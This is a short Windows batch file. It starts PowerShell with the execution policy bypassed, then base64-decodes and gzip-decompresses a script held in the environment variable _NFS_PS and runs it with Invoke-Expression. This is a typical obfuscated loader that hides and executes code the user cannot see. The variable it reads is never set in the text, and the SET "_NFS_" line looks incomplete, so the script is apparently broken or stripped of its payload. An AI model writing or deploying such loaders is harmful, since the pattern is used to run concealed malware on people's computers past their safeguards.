@ECHO OFF
SETLOCAL
    SET "_NFS_"

WHERE POWERSHELL.EXE >NUL 2>&1
IF ERRORLEVEL 1 (
    ECHO PowerShell was not found.
    ENDLOCAL
    EXIT /B 1
)

POWERSHELL.EXE -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::FromBase64String($env:_NFS_PS);$m=New-Object IO.MemoryStream(,$b);$g=New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress);$r=New-Object IO.StreamReader($g);Invoke-Expression $r.ReadToEnd()"

SET "_NFS_EXIT=%ERRORLEVEL%"
ENDLOCAL & EXIT /B %_NFS_EXIT%
